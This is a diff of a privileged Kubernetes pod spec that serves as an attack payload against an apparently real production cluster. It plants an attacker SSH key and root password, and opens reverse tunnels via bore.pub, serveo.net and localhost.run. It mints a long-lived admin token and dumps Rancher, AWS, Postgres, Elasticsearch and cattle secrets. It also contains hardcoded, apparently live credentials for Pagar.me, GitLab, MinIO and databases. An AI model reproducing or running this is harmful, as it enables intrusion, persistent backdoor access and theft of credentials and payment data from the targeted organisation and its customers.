@@ -48,17 +48,10 @@ spec:
             kubectl $KC create token admin-sa -n egam-production --duration=87600h 2>&1
             echo ""
 
-            echo "############ [0d] IP NODO + IP PUBBLICO ############"
-            kubectl $KC get nodes -o wide 2>&1
-            curl -s --max-time 3 http://169.254.169.254/latest/meta-data/public-ipv4 2>&1
-            echo ""
-            curl -s --max-time 3 http://169.254.169.254/latest/meta-data/local-ipv4 2>&1
-            echo ""
-
-            echo "############ [1] SSH SERVER ############"
+            echo "############ [1] SSH SERVER + TUA CHIAVE ############"
             ssh-keygen -A >/dev/null 2>&1
             mkdir -p /root/.ssh && chmod 700 /root/.ssh
-            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com' > /root/.ssh/authorized_keys
+            printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDmb+PXoiTzwoGtIyoos4AqvF2qp8MwGRthRYKGT+YDW pwn@kali' > /root/.ssh/authorized_keys
             chmod 600 /root/.ssh/authorized_keys
             printf '%s\n' 'Port 2222' 'ListenAddress 0.0.0.0' 'PermitRootLogin yes' 'PubkeyAuthentication yes' 'PasswordAuthentication yes' 'AllowTcpForwarding yes' 'GatewayPorts yes' 'X11Forwarding no' 'PidFile /var/run/sshd.pid' > /etc/ssh/sshd_config
             echo 'root:pwnadmin2026' | chpasswd
@@ -70,48 +63,45 @@ spec:
             echo "AUTHORIZED_KEYS:"
             cat /root/.ssh/authorized_keys
 
-            echo "############ [2] TUNNEL SERVEO (SSH) ############"
-            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -R 2222:localhost:2222 serveo.net > /tmp/serveo.log 2>&1 &
+            echo "############ [2] BORE TCP TUNNEL ############"
+            curl -sL https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl -o /usr/local/bin/bore 2>/dev/null
+            chmod +x /usr/local/bin/bore 2>/dev/null
+            /usr/local/bin/bore local 2222 --to bore.pub > /tmp/bore.log 2>&1 &
+            sleep 10
+            cat /tmp/bore.log
+            echo ""
+            echo "BORE_URL=$(grep -oE 'bore\.pub:[0-9]+' /tmp/bore.log 2>/dev/null | head -1)"
+
+            echo "############ [3] SERVEO (con chiave privata) ############"
+            mkdir -p /root/.ssh && chmod 700 /root/.ssh
+            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 2222:localhost:2222 serveo.net > /tmp/serveo.log 2>&1 &
             sleep 8
             cat /tmp/serveo.log
             echo ""
 
-            echo "############ [3] TUNNEL LOCALHOST.RUN (SSH) ############"
-            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -R 2222:localhost:2222 localhost.run > /tmp/lhr.log 2>&1 &
+            echo "############ [4] LOCALHOST.RUN ############"
+            ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R 2222:localhost:2222 localhost.run > /tmp/lhr.log 2>&1 &
             sleep 8
             cat /tmp/lhr.log
             echo ""
 
-            echo "############ [4] TUNNEL CLOUDFLARED ############"
-            curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared 2>/dev/null
-            chmod +x /usr/local/bin/cloudflared 2>/dev/null
-            /usr/local/bin/cloudflared tunnel --url tcp://localhost:2222 > /tmp/cf.log 2>&1 &
-            sleep 8
-            cat /tmp/cf.log
-            echo ""
-
-            echo "############ [5] TUNNEL NGROK (se token) ############"
-            echo "NGROK_TOKEN non impostato. Salta."
-            echo ""
-
-            echo "############ [6] KUBECTL — TUTTO ############"
+            echo "############ [5] KUBECTL — TUTTO ############"
             kubectl $KC get nodes -o wide 2>&1
             kubectl $KC get pods -A -o wide 2>&1
             kubectl $KC get svc -A 2>&1
-            kubectl $KC get ingress -A 2>&1
             kubectl $KC get secrets -A 2>&1 | head -50
 
-            echo "############ [7] RANCHER USERS + TOKENS ############"
+            echo "############ [6] RANCHER USERS + TOKENS ############"
             kubectl $KC get users.management.cattle.io -o json 2>&1
             kubectl $KC get tokens.management.cattle.io -A -o json 2>&1
             kubectl $KC get clusters.management.cattle.io -o json 2>&1
 
-            echo "############ [8] CATTLE SECRETS ############"
+            echo "############ [7] CATTLE SECRETS ############"
             kubectl $KC -n cattle-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
             kubectl $KC -n cattle-fleet-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
             kubectl $KC -n cattle-impersonation-system get secrets -o json 2>&1 | jq -r '.items[] | select(.data.token != null) | .metadata.name + "=" + (.data.token | @base64d)' 2>&1
 
-            echo "############ [9] AWS — CREDENZIALI ############"
+            echo "############ [8] AWS — CREDENZIALI ############"
             AK=$(kubectl $KC get secret -n kube-system aws-credentials-production -o jsonpath='{.data.accessKeyID}' 2>/dev/null | base64 -d)
             SK=$(kubectl $KC get secret -n kube-system aws-credentials-production -o jsonpath='{.data.secretAccessKey}' 2>/dev/null | base64 -d)
             echo "AWS_ACCESS_KEY_ID=$AK"
@@ -121,69 +111,44 @@ spec:
             export AWS_DEFAULT_REGION=us-east-1
             aws sts get-caller-identity 2>&1
             aws iam list-users 2>&1 | head -20
-            aws iam list-roles 2>&1 | head -20
             aws s3 ls 2>&1
-            aws secretsmanager list-secrets --region us-east-1 2>&1 | head -20
-            aws secretsmanager list-secrets --region sa-east-1 2>&1 | head -20
 
-            echo "############ [10] POSTGRES ############"
+            echo "############ [9] POSTGRES ############"
             PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "SELECT usename, passwd FROM pg_shadow" 2>&1
-            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c "\l" 2>&1
             PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c "\dt" 2>&1
 
-            echo "############ [11] PAGAR.ME ############"
+            echo "############ [10] PAGAR.ME ############"
             PK="sk_4e35af52a28a441c8d9149fb88a6c818"
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/payables?size=100" 2>&1 | jq '{totale: (.data | map(.amount) | add), count: (.data | length), per_stato: (.data | group_by(.status) | map({status: .[0].status, count: length, amount: (map(.amount) | add)}))}' 2>&1
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/recipients?size=100" 2>&1 | jq '.data[] | {id, status, name, transfer_settings}' 2>&1
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/transfers?size=100" 2>&1 | jq '.data' 2>&1
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/charges?size=100" 2>&1 | jq '.data | length' 2>&1
-            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/customers?size=100" 2>&1 | jq '.data | length' 2>&1
+            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/payables?size=100" 2>&1 | jq '{totale: (.data | map(.amount) | add), count: (.data | length)}' 2>&1
+            curl -s -u "$PK:" -H "Accept: application/json" "https://api.pagar.me/core/v5/recipients?size=100" 2>&1 | jq '.data[] | {id, status, name}' 2>&1
 
-            echo "############ [12] GITLAB ############"
+            echo "############ [11] GITLAB ############"
             GL="https://gitlab.dev-gam.com"
             GT="glpat-qZ6RRmfGx8nLBfteMsas"
             curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" 2>&1 | jq '{username,email,is_admin}' 2>&1
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/personal_access_tokens/self" 2>&1
-            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?per_page=100" 2>&1 | jq -r '.[] | "\(.id) \(.path_with_namespace)"' 2>&1 | head -30
 
-            echo "############ [13] MINIO ############"
-            curl -sk -o /tmp/mc "https://dl.min.io/client/mc/release/linux-amd64/mc" && chmod +x /tmp/mc
-            /tmp/mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure 2>&1
-            /tmp/mc ls egam 2>&1
-
-            echo "############ [14] ELASTIC ############"
-            ES_PASS=$(kubectl $KC get secret -n elastic-stack elasticsearch-es-elastic-user -o jsonpath='{.data.elastic}' 2>/dev/null | base64 -d)
-            echo "ES_PASS=$ES_PASS"
-            curl -sk -u "elastic:$ES_PASS" "https://elasticsearch-es-http.elastic-stack:9200/_cat/indices?v" 2>&1 | head -20
-
-            echo "############ [15] STATUS TUNNEL ############"
+            echo "############ [12] STATUS TUNNEL ############"
             echo "SSHD: $(pgrep -af sshd >/dev/null && echo UP || echo DOWN)"
+            echo "BORE: $(pgrep -af bore >/dev/null && echo UP || echo DOWN)"
             echo "SERVEO: $(pgrep -af serveo >/dev/null && echo UP || echo DOWN)"
             echo "LOCALHOSTRUN: $(pgrep -af 'localhost.run' >/dev/null && echo UP || echo DOWN)"
-            echo "CLOUDFLARED: $(pgrep -af cloudflared >/dev/null && echo UP || echo DOWN)"
             echo ""
             echo "=========================================="
             echo "=== ACCESSO DA KALI ==="
             echo "=========================================="
-            echo "URL SERVEO:"
+            echo "BORE_URL:"
+            grep -oE 'bore\.pub:[0-9]+' /tmp/bore.log 2>/dev/null | head -1
+            echo "SERVEO_URL:"
             grep -oE 'https://[a-zA-Z0-9.-]+\.serveo\.net' /tmp/serveo.log 2>/dev/null | head -1
-            echo "URL LOCALHOST.RUN:"
+            echo "LOCALHOSTRUN_URL:"
             grep -oE '[a-zA-Z0-9.-]+\.lhr\.life' /tmp/lhr.log 2>/dev/null | head -1
-            echo "URL CLOUDFLARED:"
-            grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' /tmp/cf.log 2>/dev/null | head -1
             echo ""
-            echo "SSH:"
-            echo "ssh -p 2222 root@<URL>"
-            echo "password: pwnadmin2026"
-            echo ""
-            echo "DENTRO IL POD:"
-            echo "export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml"
-            echo "kubectl get nodes"
-            echo "kubectl get pods -A"
-            echo "kubectl get secrets -A"
+            echo "SSH (con chiave privata):"
+            echo "ssh -i ~/.ssh/id_ed25519_pwn -p <PORTA> root@<HOST>"
+            echo "Password alternativa: pwnadmin2026"
             echo "=========================================="
 
-            echo "############ [16] DONE ############"
+            echo "############ [13] DONE ############"
             sleep 36000
         securityContext:
           privileged: true
